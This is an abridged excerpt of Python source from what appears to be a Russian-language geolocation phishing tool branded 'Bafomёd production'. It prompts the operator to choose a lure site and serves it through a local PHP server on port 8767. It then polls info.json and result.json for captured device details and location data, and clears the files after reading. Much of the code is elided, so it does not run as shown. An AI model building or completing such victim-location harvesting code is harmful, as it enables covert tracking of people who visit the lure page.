...
def location():
    ...
    print(page_23)
    try:
        input_loc = input(f"{COLORS.REDL} └──> {COLORS.FIOL}Bafomёd production ──>{COLORS.GNSL} Введите номер сайта: {COLORS.WHSL}")
    ...
    result_file = open("db/getloc/" + temp + "/result.json", "w")
    result_file.write("")
    result_file.close()
    # ---------------------------------------------------------------
    info_file = open("db/getloc/" + temp + "/info.json", "w")
    info_file.write("")
    info_file.close()
    ...
    def deafult_server():
        try:
            with open("db/location_log.log", "w") as deafult:
                Popen(('php', '-S', 'localhost:8767', '-t', 'db/getloc/' + temp), stdout=deafult, stderr=deafult)
    ...
    def info():
        global stat_file_ip
        if not str(os.stat('db/getloc/' + temp + '/info.json').st_size) == stat_file_ip:
            stat_file_ip = str(os.stat('db/getloc/' + temp + '/info.json').st_size)
            file_ip = open('db/getloc/' + temp + '/info.json', "r")
            i = file_ip.read()
            try:
                infor = json.loads(i)
                for value in infor['dev']:
                    ...
                    file_recv = open("db/getloc/" + temp + "/info.json", "w")
    ...
    def recv_loc():
        global stat_file_ip
        if not str(os.stat('db/getloc/' + temp + '/result.json').st_size) == stat_file_ip:
            stat_file_ip = str(os.stat('db/getloc/' + temp + '/result.json').st_size)
            file_ip = open('db/getloc/' + temp + '/result.json', "r")
            i = file_ip.read()
            try:
                infor = json.loads(i)
                for value in infor['info']:
                    ...
                    file_recv = open("db/getloc/" + temp + "/result.json", "w")
                    file_recv.write("")
                    file_recv.close()
